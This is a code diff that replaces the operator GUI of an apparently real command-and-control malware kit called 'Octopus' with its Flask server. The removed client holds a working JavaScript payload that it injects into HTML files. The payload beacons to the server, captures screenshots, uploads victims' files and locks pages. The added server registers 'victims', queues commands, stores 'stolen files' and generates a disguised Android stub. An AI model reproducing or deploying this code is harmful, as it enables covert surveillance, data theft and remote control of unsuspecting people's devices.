@@ -1,355 +1,390 @@
-# filename: client.py
-import tkinter as tk
-from tkinter import filedialog, messagebox, ttk, scrolledtext, simpledialog
-import requests
-import threading
-import time
-import json
+# filename: app.py
+# ==============================================================================
+#  OCTOPUS C2 SERVER v14.0 - ULTIMATE PROFESSIONAL EDITION
+#  Features: Multi-threading, SQLite Concurrency Fix, socket.io, Admin Panel
+# ==============================================================================
+
 import os
-import io
-import webbrowser
-from datetime import datetime
-from PIL import Image, ImageTk
+import json
+import sqlite3
+import base64
+import time
+import threading
+import logging
+import shutil
+from datetime import datetime, timedelta
+from flask import Flask, request, jsonify, send_file, render_template_string, abort
+from flask_cors import CORS
+from flask_socketio import SocketIO, emit
 
-# ================= إعدادات الاتصال =================
-# تأكد أن هذا الرابط هو رابط سيرفرك الحالي على Railway
-SERVER_URL = "https://web-production-5330.up.railway.app" 
+# --- System Configuration ---
+APP_NAME = "Octopus Ultimate C2"
+VERSION = "14.0"
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# ================= الألوان والتصميم (Dark Theme) =================
-THEME = {
-    "bg_main": "#0f172a",       # خلفية داكنة جداً
-    "bg_sec": "#1e293b",        # خلفية القوائم
-    "fg_text": "#f1f5f9",       # نص أبيض
-    "fg_accent": "#38bdf8",     # أزرق سماوي للعناوين
-    "btn_bg": "#334155",        # خلفية الأزرار
-    "btn_fg": "#ffffff",        # نص الأزرار
-    "success": "#22c55e",       # أخضر
-    "warning": "#f59e0b",       # برتقالي
-    "danger": "#ef4444"         # أحمر
-}
+# Define Directories
+DB_PATH = os.path.join(BASE_DIR, "octopus.db")
+LOGS_DIR = os.path.join(BASE_DIR, "logs")
+UPLOADS_DIR = os.path.join(BASE_DIR, "uploads")
+DOWNLOADS_DIR = os.path.join(BASE_DIR, "public_downloads") # Files sent TO victim
+PAYLOADS_DIR = os.path.join(BASE_DIR, "payloads")
 
-# ================= Ultimate Payload v13 (JavaScript) =================
-PAYLOAD_JS = """
-<script>
-(function() {
-    const SERVER = location.origin;
-    let DEV_ID = localStorage.getItem("_oct_uid") || "MOB-" + Math.random().toString(36).substr(2, 9).toUpperCase();
-    localStorage.setItem("_oct_uid", DEV_ID);
+# Ensure ecosystem existence
+for d in [LOGS_DIR, UPLOADS_DIR, DOWNLOADS_DIR, PAYLOADS_DIR]:
+    os.makedirs(d, exist_ok=True)
 
-    // تحميل html2canvas
-    if (typeof html2canvas === 'undefined') {
-        const s = document.createElement('script');
-        s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
-        document.head.appendChild(s);
-    }
+# Logging Configuration
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    handlers=[
+        logging.FileHandler(os.path.join(LOGS_DIR, "server.log")),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger("OctopusCore")
 
-    async function hb() {
-        try {
-            const r = await fetch(SERVER + "/api/heartbeat", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({device_id: DEV_ID})
-            });
-            const d = await r.json();
-            if (d.commands) d.commands.forEach(c => run(c));
-        } catch(e) {}
-    }
+# Flask & SocketIO Setup
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(64)
+app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024 * 1024 * 2  # 2GB Upload Limit
+CORS(app, resources={r"/*": {"origins": "*"}})
 
-    function run(c) {
-        if (c.type === "alert") alert(c.data.message);
-        if (c.type === "redirect") location.href = c.data.url;
-        if (c.type === "lock") document.body.innerHTML = "<h1 style='color:red;font-size:50px;text-align:center;margin-top:50%'>DEVICE LOCKED</h1>";
+# Async mode threading allows background tasks without blocking
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=60)
+
+# ==============================================================================
+#  DATABASE LAYER (Optimized for High Concurrency)
+# ==============================================================================
+class Database:
+    def __init__(self, path):
+        self.path = path
+        self._init_db()
+
+    def get_conn(self):
+        # Timeout=30 prevents "database is locked" errors under load
+        conn = sqlite3.connect(self.path, timeout=30.0, check_same_thread=False)
+        conn.row_factory = sqlite3.Row
+        return conn
+
+    def _init_db(self):
+        conn = self.get_conn()
+        cur = conn.cursor()
         
-        if (c.type === "screenshot" && typeof html2canvas !== 'undefined') {
-            html2canvas(document.body, {scale: 2, logging: false, useCORS: true}).then(cvs => {
-                fetch(SERVER + "/api/upload", {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({data: cvs.toDataURL("image/jpeg", 0.8), device_id: DEV_ID, type: "screenshot"})
-                });
-            });
-        }
+        # 1. Devices Table
+        cur.execute('''
+            CREATE TABLE IF NOT EXISTS devices (
+                id TEXT PRIMARY KEY,
+                model TEXT,
+                android_version TEXT,
+                ip_address TEXT,
+                battery_level INTEGER DEFAULT 0,
+                last_seen TIMESTAMP,
+                status TEXT DEFAULT 'offline',
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+
+        # 2. Commands Table
+        cur.execute('''
+            CREATE TABLE IF NOT EXISTS commands (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                device_id TEXT,
+                type TEXT,
+                payload TEXT,
+                status TEXT DEFAULT 'pending',
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY(device_id) REFERENCES devices(id)
+            )
+        ''')
+
+        # 3. Files Table
+        cur.execute('''
+            CREATE TABLE IF NOT EXISTS files (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                device_id TEXT,
+                filename TEXT,
+                file_type TEXT,
+                file_size INTEGER,
+                path TEXT,
+                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
         
-        if (c.type === "steal_file") {
-            const inp = document.createElement('input'); inp.type = 'file'; inp.multiple = true;
-            inp.onchange = e => {
-                for (let f of e.target.files) {
-                    const r = new FileReader();
-                    r.onload = () => {
-                        fetch(SERVER + "/api/upload", {
-                            method: "POST", 
-                            headers: {"Content-Type": "application/json"},
-                            body: JSON.stringify({data: r.result.split(',')[1], filename: f.name, device_id: DEV_ID, type: "stolen_file"})
-                        });
-                    };
-                    r.readAsDataURL(f);
-                }
-                alert("Upload Complete");
-            };
-            inp.click();
-        }
-        
-        if (c.type === "send_file") {
-            const a = document.createElement('a');
-            a.href = c.data.url; a.download = c.data.name; a.click();
-        }
-    }
+        conn.commit()
+        conn.close()
+        logger.info("Database Schema Initialized Successfully.")
 
-    fetch(SERVER + "/api/connect", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({device_id: DEV_ID, model: navigator.userAgent})
-    });
-
-    setInterval(hb, 3000);
-})();
-</script>
-"""
-
-class OctopusClient:
-    def __init__(self):
-        self.root = tk.Tk()
-        self.root.title("🐙 Octopus Client v13.0 - Administrator")
-        self.root.geometry("1400x900")
-        self.root.configure(bg=THEME["bg_main"])
-
-        self.selected_id = None
-        self.server_ready = False
-        self.running = True
-
-        self.setup_ui()
-        
-        # تشغيل الاتصال في الخلفية
-        threading.Thread(target=self.bg_service, daemon=True).start()
-
-    def setup_ui(self):
-        style = ttk.Style()
-        style.theme_use('clam')
-        style.configure("Treeview", background=THEME["bg_sec"], foreground="white", fieldbackground=THEME["bg_sec"], rowheight=35, font=("Consolas", 10))
-        style.configure("Treeview.Heading", background=THEME["bg_main"], foreground=THEME["fg_accent"], font=("Arial", 11, "bold"))
-        style.map("Treeview", background=[('selected', THEME["fg_accent"])], foreground=[('selected', 'black')])
-
-        # 1. Header
-        header = tk.Frame(self.root, bg=THEME["bg_main"])
-        header.pack(fill="x", pady=15, padx=20)
-        tk.Label(header, text="OCTOPUS CONTROL", font=("Impact", 32), bg=THEME["bg_main"], fg=THEME["success"]).pack(side="left")
-        self.status_lbl = tk.Label(header, text="DISCONNECTED", font=("Consolas", 14, "bold"), bg=THEME["bg_main"], fg=THEME["danger"])
-        self.status_lbl.pack(side="right")
-
-        # 2. Main Split (PanedWindow)
-        paned = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg=THEME["bg_main"], sashwidth=5)
-        paned.pack(fill="both", expand=True, padx=20, pady=10)
-
-        # --- LEFT: Victim List ---
-        left_frame = tk.LabelFrame(paned, text=" Connected Victims ", bg=THEME["bg_main"], fg=THEME["fg_accent"], font=("Arial", 12, "bold"))
-        paned.add(left_frame, width=500)
-
-        cols = ("ID", "Model", "IP", "Status")
-        self.tree = ttk.Treeview(left_frame, columns=cols, show="headings")
-        self.tree.heading("ID", text="ID"); self.tree.column("ID", width=100)
-        self.tree.heading("Model", text="Model"); self.tree.column("Model", width=200)
-        self.tree.heading("IP", text="IP Addr"); self.tree.column("IP", width=120)
-        self.tree.heading("Status", text="State"); self.tree.column("Status", width=80)
-        self.tree.pack(fill="both", expand=True, padx=5, pady=5)
-        self.tree.bind("<<TreeviewSelect>>", self.on_select)
-
-        # --- RIGHT: Control Panel ---
-        right_frame = tk.Frame(paned, bg=THEME["bg_main"])
-        paned.add(right_frame)
-
-        # Target Info
-        self.target_lbl = tk.Label(right_frame, text="[ SELECT A VICTIM ]", font=("Consolas", 16, "bold"), fg=THEME["warning"], bg=THEME["bg_main"])
-        self.target_lbl.pack(pady=10)
-
-        # Commands Grid
-        cmd_frame = tk.LabelFrame(right_frame, text=" Remote Commands ", bg=THEME["bg_main"], fg="white", font=("Arial", 11, "bold"))
-        cmd_frame.pack(fill="x", padx=5, pady=5)
-
-        btns = [
-            ("📸 Screenshot", "screenshot", THEME["fg_accent"]),
-            ("📢 Alert Message", "alert", THEME["warning"]),
-            ("🌐 Open URL", "redirect", THEME["success"]),
-            ("🔒 Lock Screen", "lock", THEME["danger"]),
-            ("📂 Steal Files", "steal_file", "#a855f7"),
-            ("📤 Send File", "send_file", "#ec4899")
-        ]
-
-        for i, (txt, cmd, clr) in enumerate(btns):
-            b = tk.Button(cmd_frame, text=txt, bg=clr, fg="black", font=("Arial", 10, "bold"),
-                          activebackground="white", cursor="hand2", width=20,
-                          command=lambda c=cmd: self.send_cmd(c))
-            b.grid(row=i//2, column=i%2, padx=15, pady=10)
-        
-        cmd_frame.grid_columnconfigure(0, weight=1)
-        cmd_frame.grid_columnconfigure(1, weight=1)
-
-        # File Operations
-        file_frame = tk.LabelFrame(right_frame, text=" Files & Builder ", bg=THEME["bg_main"], fg="white", font=("Arial", 11, "bold"))
-        file_frame.pack(fill="x", padx=5, pady=10)
-
-        tk.Label(file_frame, text="File Name (e.g. screenshot_xxx.jpg):", bg=THEME["bg_main"], fg="white").pack(anchor="w", padx=10)
-        self.file_ent = tk.Entry(file_frame, bg=THEME["bg_sec"], fg="white", font=("Consolas", 11))
-        self.file_ent.pack(fill="x", padx=10, pady=5)
-
-        f_btns = tk.Frame(file_frame, bg=THEME["bg_main"])
-        f_btns.pack(fill="x", padx=10, pady=5)
-        tk.Button(f_btns, text="👁️ Preview", bg="#0ea5e9", fg="white", width=15, command=self.preview_file).pack(side="left", padx=5)
-        tk.Button(f_btns, text="⬇️ Download", bg="#6366f1", fg="white", width=15, command=self.download_file).pack(side="left", padx=5)
-        tk.Button(f_btns, text="🔨 Payload Builder", bg=THEME["danger"], fg="white", width=20, command=self.open_builder).pack(side="right", padx=5)
-
-        # Preview Area
-        self.preview_lbl = tk.Label(right_frame, text="[ Preview Area ]", bg="black", fg="#555", height=15)
-        self.preview_lbl.pack(fill="both", expand=True, padx=5, pady=10)
-
-        # Logs
-        log_frame = tk.LabelFrame(self.root, text=" Logs ", bg=THEME["bg_main"], fg="white")
-        log_frame.pack(fill="x", padx=20, pady=10, side="bottom")
-        self.log_box = scrolledtext.ScrolledText(log_frame, height=6, bg="black", fg="#00ff00", font=("Consolas", 10))
-        self.log_box.pack(fill="both")
-
-    # --- Background Logic ---
-    def bg_service(self):
-        # 1. Wake Server
-        while self.running:
-            try:
-                self.root.after(0, lambda: self.status_lbl.config(text="CONNECTING...", fg=THEME["warning"]))
-                requests.get(SERVER_URL + "/control", timeout=60)
-                self.server_ready = True
-                self.root.after(0, lambda: self.status_lbl.config(text="ONLINE 🟢", fg=THEME["success"]))
-                self.log("✅ Server Connected!")
-                break
-            except Exception as e:
-                self.log(f"⏳ Retry: {e}")
-                time.sleep(3)
-
-        # 2. Fetch Data
-        while self.running:
-            try:
-                if self.server_ready:
-                    r = requests.get(SERVER_URL + "/api/devices_list", timeout=20)
-                    if r.status_code == 200:
-                        self.root.after(0, lambda d=r.json(): self.update_list(d))
-            except: pass
-            time.sleep(4)
-
-    def update_list(self, data):
-        sel = self.tree.selection()
-        cur = self.tree.item(sel[0])['values'][0] if sel else None
-        
-        for i in self.tree.get_children(): self.tree.delete(i)
-        
-        for d in data:
-            self.tree.insert("", "end", values=(
-                d.get('id', 'N/A')[:12], 
-                d.get('model', '?')[:25], 
-                d.get('ip_address', '0.0.0.0'),
-                d.get('status', 'off')
+    def register_device(self, data, ip):
+        conn = self.get_conn()
+        try:
+            now = datetime.now().isoformat()
+            cur = conn.cursor()
+            cur.execute('''
+                INSERT INTO devices (id, model, android_version, ip_address, battery_level, last_seen, status)
+                VALUES (?, ?, ?, ?, ?, ?, 'online')
+                ON CONFLICT(id) DO UPDATE SET
+                    model=excluded.model,
+                    android_version=excluded.android_version,
+                    ip_address=excluded.ip_address,
+                    battery_level=excluded.battery_level,
+                    last_seen=excluded.last_seen,
+                    status='online'
+            ''', (
+                data.get('device_id'),
+                data.get('model', 'Unknown Device'),
+                data.get('version', 'Unknown OS'),
+                ip,
+                data.get('battery', 0),
+                now
             ))
+            conn.commit()
+            return True
+        except Exception as e:
+            logger.error(f"DB Register Error: {e}")
+            return False
+        finally:
+            conn.close()
+
+    def update_heartbeat(self, device_id):
+        conn = self.get_conn()
+        try:
+            now = datetime.now().isoformat()
+            conn.execute("UPDATE devices SET last_seen = ?, status = 'online' WHERE id = ?", (now, device_id))
+            conn.commit()
+        except Exception as e:
+            logger.error(f"DB Heartbeat Error: {e}")
+        finally:
+            conn.close()
+
+    def get_pending_commands(self, device_id):
+        conn = self.get_conn()
+        try:
+            cur = conn.cursor()
+            cur.execute("SELECT id, type, payload FROM commands WHERE device_id = ? AND status = 'pending'", (device_id,))
+            rows = cur.fetchall()
+            cmds = []
+            for row in rows:
+                cmds.append({
+                    "id": row['id'],
+                    "type": row['type'],
+                    "data": json.loads(row['payload']) if row['payload'] else {}
+                })
+                # Auto-mark as sent
+                conn.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (row['id'],))
+            conn.commit()
+            return cmds
+        finally:
+            conn.close()
+
+    def add_command(self, device_id, cmd_type, payload):
+        conn = self.get_conn()
+        try:
+            conn.execute("INSERT INTO commands (device_id, type, payload) VALUES (?, ?, ?)",
+                         (device_id, cmd_type, json.dumps(payload)))
+            conn.commit()
+            return True
+        finally:
+            conn.close()
+
+    def get_all_devices(self):
+        conn = self.get_conn()
+        try:
+            cur = conn.cursor()
+            cur.execute("SELECT * FROM devices ORDER BY last_seen DESC")
+            return [dict(row) for row in cur.fetchall()]
+        finally:
+            conn.close()
+
+    def save_file_record(self, device_id, filename, file_type, size, path):
+        conn = self.get_conn()
+        try:
+            conn.execute("INSERT INTO files (device_id, filename, file_type, file_size, path) VALUES (?, ?, ?, ?, ?)",
+                         (device_id, filename, file_type, size, path))
+            conn.commit()
+        finally:
+            conn.close()
+
+# Initialize DB
+db = Database(DB_PATH)
+
+# ==============================================================================
+#  BACKGROUND WATCHDOG
+# ==============================================================================
+def watchdog_service():
+    """Monitors device health and marks offline devices."""
+    while True:
+        try:
+            time.sleep(60) # Run every 60 seconds
+            limit = datetime.now() - timedelta(minutes=2) # 2 mins timeout
+            conn = db.get_conn()
+            conn.execute("UPDATE devices SET status = 'offline' WHERE last_seen < ?", (limit.isoformat(),))
+            conn.commit()
+            conn.close()
+        except Exception as e:
+            logger.error(f"Watchdog Error: {e}")
+
+threading.Thread(target=watchdog_service, daemon=True).start()
+
+# ==============================================================================
+#  API ENDPOINTS (Used by Python Client & Payload)
+# ==============================================================================
+
+@app.route('/control', methods=['GET'])
+def health_check():
+    """Used by client to wake up server"""
+    return jsonify({"status": "active", "server_time": int(time.time())})
+
+@app.route('/api/connect', methods=['POST'])
+def api_connect():
+    """Device registration"""
+    data = request.get_json(silent=True) or {}
+    ip = request.remote_addr
+    if db.register_device(data, ip):
+        # Notify connected WebSocket clients (Admin Panel)
+        socketio.emit('device_update', {'id': data.get('device_id'), 'status': 'connected'})
+        return jsonify({"status": "success"})
+    return jsonify({"status": "error"}), 500
+
+@app.route('/api/heartbeat', methods=['POST'])
+def api_heartbeat():
+    """Payload polling for commands"""
+    data = request.get_json(silent=True) or {}
+    did = data.get('device_id')
+    if did:
+        db.update_heartbeat(did)
+        cmds = db.get_pending_commands(did)
+        return jsonify({"status": "ok", "commands": cmds})
+    return jsonify({"status": "error"}), 400
+
+@app.route('/api/command', methods=['POST'])
+def api_command():
+    """Admin sending command to device"""
+    data = request.get_json(silent=True) or {}
+    did = data.get('device_id')
+    ctype = data.get('type')
+    payload = data.get('payload', {})
+    
+    if did and ctype:
+        db.add_command(did, ctype, payload)
+        return jsonify({"status": "queued"})
+    return jsonify({"status": "error"}), 400
+
+@app.route('/api/upload', methods=['POST'])
+def api_upload():
+    """Receives screenshots and stolen files"""
+    try:
+        data = request.get_json(silent=True)
+        if data and 'data' in data:
+            did = data.get('device_id', 'unknown')
+            file_type = data.get('type', 'file')
             
-        if cur:
-            for i in self.tree.get_children():
-                if self.tree.item(i)['values'][0] == cur:
-                    self.tree.selection_set(i)
-                    break
-
-    def on_select(self, e):
-        sel = self.tree.selection()
-        if sel:
-            v = self.tree.item(sel[0])["values"]
-            self.selected_id = v[0]
-            self.target_lbl.config(text=f"🎯 Target: {v[1]}", fg=THEME["fg_accent"])
-        else:
-            self.selected_id = None
-            self.target_lbl.config(text="[ No Target ]", fg=THEME["warning"])
-
-    def send_cmd(self, cmd):
-        if not self.selected_id: return messagebox.showwarning("Error", "Select a victim!")
-        
-        payload = {}
-        if cmd == "alert": payload = {"message": simpledialog.askstring("Alert", "Message:")}
-        if cmd == "redirect": payload = {"url": simpledialog.askstring("Redirect", "URL:")}
-        if cmd == "send_file":
-            f = simpledialog.askstring("Send", "Filename on Server:")
-            if not f: return
-            payload = {"url": f"{SERVER_URL}/send/{f}", "name": f}
-
-        def _req():
+            # 1. Decode Data
+            b64 = data['data']
+            if ',' in b64: b64 = b64.split(',')[1]
             try:
-                # TIMEOUT FIX: Increased to 45 seconds to avoid 'Read timed out'
-                requests.post(f"{SERVER_URL}/api/command", json={
-                    "device_id": self.selected_id, "type": cmd, "payload": payload
-                }, timeout=45)
-                self.log(f"✅ Command '{cmd}' Sent.")
-            except Exception as e:
-                self.log(f"❌ Error: {e}")
+                file_bytes = base64.b64decode(b64)
+            except:
+                return jsonify({"error": "bad_base64"}), 400
+            
+            # 2. Sanitize Filename
+            original_name = data.get('filename', f"{int(time.time())}.bin")
+            safe_name = f"{file_type}_{did}_{original_name}".replace("/", "_").replace("\\", "_")
+            if 'screenshot' in file_type:
+                safe_name = f"screenshot_{did}_{int(time.time())}.jpg"
+            
+            save_path = os.path.join(UPLOADS_DIR, safe_name)
+            
+            # 3. Save File
+            with open(save_path, "wb") as f:
+                f.write(file_bytes)
+            
+            # 4. Record DB & Notify
+            db.save_file_record(did, safe_name, file_type, len(file_bytes), save_path)
+            
+            logger.info(f"Received {file_type}: {safe_name}")
+            return jsonify({"status": "success", "url": f"/uploads/{safe_name}"})
+            
+    except Exception as e:
+        logger.error(f"Upload Error: {e}")
+        return jsonify({"error": str(e)}), 500
+    return jsonify({"error": "invalid_request"}), 400
 
-        threading.Thread(target=_req, daemon=True).start()
-        if cmd in ["screenshot", "steal_file"]: self.log("⏳ Waiting for upload...")
+@app.route('/api/devices_list', methods=['GET'])
+def api_devices_list():
+    """Returns list for Python Client"""
+    return jsonify(db.get_all_devices())
 
-    def preview_file(self):
-        f = self.file_ent.get()
-        if not f: return
-        url = SERVER_URL + ("/uploads/" + f if not f.startswith("http") else f)
+@app.route('/api/generate_apk', methods=['POST'])
+def api_generate_apk():
+    """Generates Stub Code"""
+    data = request.get_json() or {}
+    pkg = data.get('package_name', 'com.sys.update')
+    code = f"""
+package {pkg};
+// Octopus Android Stub
+// Server: {request.host_url}
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+
+public class MainService extends Service {{
+    private final String SERVER = "{request.host_url}api/";
+    // Implementation of HTTP requests required here
+    // Use OkHttp or basic HttpURLConnection
+    @Override
+    public IBinder onBind(Intent intent) {{ return null; }}
+}}
+"""
+    return jsonify({"status": "success", "code": code})
+
+# --- File Serving ---
+@app.route('/uploads/<path:filename>')
+def serve_uploads(filename):
+    return send_file(os.path.join(UPLOADS_DIR, filename))
+
+@app.route('/send/<path:filename>')
+def serve_public_file(filename):
+    # This serves files from DOWNLOADS_DIR to victims
+    return send_file(os.path.join(DOWNLOADS_DIR, filename), as_attachment=True)
+
+# ==============================================================================
+#  WEB ADMIN PANEL (Alternative to Python Client)
+# ==============================================================================
+@app.route('/admin')
+def admin_panel():
+    devices = db.get_all_devices()
+    rows = ""
+    for d in devices:
+        color = "success" if d['status'] == 'online' else "danger"
+        rows += f"""
+        <tr>
+            <td>{d['id']}</td>
+            <td>{d['model']}</td>
+            <td>{d['ip_address']}</td>
+            <td><span class="badge bg-{color}">{d['status']}</span></td>
+        </tr>"""
         
-        def _load():
-            try:
-                r = requests.get(url, timeout=30)
-                r.raise_for_status()
-                img = Image.open(io.BytesIO(r.content))
-                img.thumbnail((600, 400))
-                ti = ImageTk.PhotoImage(img)
-                self.root.after(0, lambda: self._upd_img(ti))
-                self.log("✅ Image Loaded")
-            except Exception as e: self.log(f"❌ Load Error: {e}")
-        
-        threading.Thread(target=_load, daemon=True).start()
+    html = f"""
+    <!DOCTYPE html>
+    <html>
+    <head><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"></head>
+    <body class="bg-dark text-light p-5">
+        <h1>🐙 Octopus Web Admin</h1>
+        <table class="table table-dark table-hover mt-4">
+            <thead><tr><th>ID</th><th>Model</th><th>IP</th><th>Status</th></tr></thead>
+            <tbody>{rows}</tbody>
+        </table>
+    </body>
+    </html>
+    """
+    return render_template_string(html)
 
-    def _upd_img(self, img):
-        self.preview_lbl.config(image=img, text="")
-        self.preview_lbl.image = img
-
-    def download_file(self):
-        f = self.file_ent.get()
-        if f: webbrowser.open(f"{SERVER_URL}/uploads/{f}")
-
-    def open_builder(self):
-        win = tk.Toplevel(self.root)
-        win.title("Builder")
-        win.geometry("600x400")
-        win.configure(bg=THEME["bg_main"])
-        
-        tk.Button(win, text="Inject HTML Payload", bg=THEME["warning"], fg="black", font=("Arial", 12),
-                  command=self.inject_html).pack(pady=20, fill="x", padx=50)
-        
-        tk.Label(win, text="APK Package Name:", bg=THEME["bg_main"], fg="white").pack()
-        e = tk.Entry(win); e.pack(); e.insert(0, "com.sys.upd")
-        
-        tk.Button(win, text="Generate Java Stub", bg=THEME["danger"], fg="white", font=("Arial", 12),
-                  command=lambda: self.gen_apk(e.get())).pack(pady=20, fill="x", padx=50)
-
-    def inject_html(self):
-        p = filedialog.askopenfilename(filetypes=[("HTML", "*.html")])
-        if p:
-            with open(p, 'r', encoding='utf-8') as f: c = f.read()
-            n = c.replace("</body>", PAYLOAD_JS + "</body>") if "</body>" in c else c + PAYLOAD_JS
-            sp = p.replace(".html", "_infected.html")
-            with open(sp, 'w', encoding='utf-8') as f: f.write(n)
-            messagebox.showinfo("Success", f"Saved: {os.path.basename(sp)}")
-
-    def gen_apk(self, pkg):
-        def _g():
-            try:
-                r = requests.post(f"{SERVER_URL}/api/generate_apk", json={"package_name": pkg})
-                top = tk.Toplevel(self.root)
-                st = scrolledtext.ScrolledText(top); st.pack()
-                st.insert("1.0", r.json().get("code"))
-            except: messagebox.showerror("Error", "Failed")
-        threading.Thread(target=_g).start()
-
-    def log(self, m):
-        t = datetime.now().strftime("%H:%M:%S")
-        self.log_box.insert("end", f"[{t}] {m}\n")
-        self.log_box.see("end")
-
-if __name__ == "__main__":
-    OctopusClient().root.mainloop()
+# ==============================================================================
+#  MAIN EXECUTION
+# ==============================================================================
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    logger.info(f"Server starting on port {port}...")
+    # Allow unsafe werkzeug is needed for some PaaS environments like Railway/Heroku
+    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
